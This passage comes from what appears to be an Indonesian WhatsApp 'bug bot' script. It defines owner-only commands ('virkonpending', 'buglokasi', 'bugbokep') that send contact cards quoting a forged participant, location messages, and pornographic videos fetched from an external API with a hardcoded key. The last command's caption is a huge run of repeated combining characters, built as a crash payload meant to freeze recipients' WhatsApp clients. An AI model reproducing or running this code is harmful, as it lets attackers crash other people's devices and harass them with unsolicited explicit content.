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\nX-WA-BIZ-DESCRIPTION:© ISAL MODS WA",
}
}), { userJid: m.chat, quoted: m })
ranz.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
//=================================================//
case 'virkonpending': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© ISAL MODS WA ${Isalmods}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:© ISAL MODS WA\nitem1.TEL;waid=999999999:+62 857-2450-6534\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:© ISAL MODS WA",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
//=================================================//
case 'buglokasi': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© ISAL MODS WA${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, location.message, { messageId: location.key.id })
}
break
//=================================================//
case 'poll': {
if (!isCreator) return
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": "© ISAL MODS WA️",
"options": [
	{
"optionName": "KATANYA WA KEBAL"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "KATANYA KEBAL"
	},
	{
"optionName": "SC BOT ISAL MODS WA"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: m.chat, quoted: m })
ranz.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
break
//=================================================//
case 'bugbokep':{
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
ranz.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `© ISAL MODS WA` }, { quoted: adehvn })
}
break
//=================================================//
case 'bugbokep2':{
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
dwhee = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
ranz.sendMessage(m.chat, { video: dwhee, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `[⫹⫺ - 㑒 ❝𝗜𝗦𝗔𝗟 𝗠𝗢𝗗𝗦❞ - ★ 𝗪𝗔 ★ ϟ〽️]\ 🦇̣̣̣̣̣̣̣̣⃟   ...𝛀..𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦𑜦